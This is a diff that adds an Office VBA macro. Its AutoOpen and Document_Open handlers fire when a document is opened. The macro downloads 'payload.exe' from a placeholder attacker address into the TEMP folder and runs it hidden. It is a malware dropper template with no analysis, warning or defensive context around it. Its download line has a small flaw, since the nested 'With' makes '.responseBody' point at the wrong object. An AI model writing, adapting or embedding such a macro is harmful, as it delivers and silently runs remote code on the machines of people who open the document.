@@ -1,0 +1,30 @@
+Sub AutoOpen()
+    Call Main
+End Sub
+
+Sub Document_Open()
+    Call Main
+End Sub
+
+Sub Main()
+    Dim strUrl As String
+    Dim strPath As String
+    strUrl = "http://<Attacker's IP Address or Domain>/payload.exe"
+    strPath = Environ("TEMP") & "\payload.exe"
+    
+    With CreateObject("MSXML2.XMLHTTP")
+        .Open "GET", strUrl, False
+        .send
+        If .Status = 200 Then
+            With CreateObject("ADODB.Stream")
+                .Type = 1
+                .Open
+                .Write .responseBody
+                .SaveToFile strPath, 2
+                .Close
+            End With
+        End If
+    End With
+    
+    Shell strPath, vbHide
+End Sub
